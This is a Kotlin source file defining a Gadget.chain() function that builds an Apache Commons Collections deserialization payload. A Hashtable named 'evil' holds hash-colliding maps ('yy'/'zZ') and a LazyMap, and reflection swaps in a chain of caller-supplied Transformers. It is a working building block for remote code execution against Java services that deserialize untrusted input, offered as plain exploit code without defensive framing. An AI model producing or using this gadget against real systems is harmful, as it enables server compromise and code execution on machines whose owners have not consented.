package ccl

import org.apache.commons.collections.Transformer
import org.apache.commons.collections.functors.ConstantTransformer
import org.apache.commons.collections.map.LazyMap
import org.apache.commons.collections.map.TransformedMap
import org.joor.Reflect
import java.util.*

object Gadget {
    fun chain(vararg transformers: Transformer): Any {
        val map1 = HashMap<Any, Any>().apply { put("yy", 1) }
        val map2 = HashMap<Any, Any>().apply { put("zZ", 1) }
        val receiver = LazyMap.decorate(map2, ConstantTransformer("void"))
        val evil = Hashtable<Any, Any>().apply {
            put(map1, 1)
            put(receiver, 2)
        }
        val map = transformers.foldRight(map2 as Map<*, *>) { transformer, acc ->
            TransformedMap.decorate(acc, null, transformer)
        }
        Reflect.on(receiver).set("map", map)
        map2.remove("yy")
        return evil
    }
}
